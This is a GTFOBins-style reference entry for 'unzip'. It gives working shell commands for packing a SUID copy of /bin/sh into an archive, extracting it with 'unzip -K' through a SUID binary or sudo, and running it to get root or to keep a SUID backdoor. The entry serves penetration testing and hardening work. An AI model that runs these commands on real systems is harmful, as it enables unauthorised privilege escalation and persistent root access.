# GTFOBin: unzip

Certain `unzip` versions allows to preserve the SUID bit. Prepare an archive beforehand with the following commands as root:

```
cp /bin/sh .
chmod +s sh
zip shell.zip sh

```

Extract it on the target, then run the SUID shell as usual (omitting the `-p` where appropriate).

## SUID

If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run `sh -p`, omit the `-p` argument on systems like Debian (<= Stretch) that allow the default `sh` shell to run with SUID privileges.

This example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.

```
sudo install -m =xs $(which unzip) .

./unzip -K shell.zip
./sh -p
```

## Sudo

If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.

```
sudo unzip -K shell.zip
./sh -p
```